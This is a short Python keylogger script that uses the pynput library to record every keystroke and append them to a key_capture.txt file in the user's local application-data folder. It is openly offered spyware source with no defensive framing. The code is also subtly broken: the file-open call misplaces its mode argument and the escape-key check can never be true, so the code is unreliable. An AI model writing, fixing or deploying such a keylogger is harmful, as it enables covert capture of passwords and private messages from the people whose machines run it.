import pynput
import os

from os import path
from pynput.keyboard import Key, Listener

count = 0
keys = []
key_dir = path.expandvars(r'%LOCALAPPDATA%')
access_rights = 0o755

try:
    os.mkdir(key_dir, access_rights)
except OSError:
    print("Creation of the directory %s failed" % key_dir)
else:
    print("Successfully created the directory %s" %  key_dir)


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(os.path.join(key_dir+"\\" + "key_capture.txt", '*a')) as f:
        for key in keys:
            k = str(key).replace("'","")
            Key.space
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if Key == Key.esc:
        return False



with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
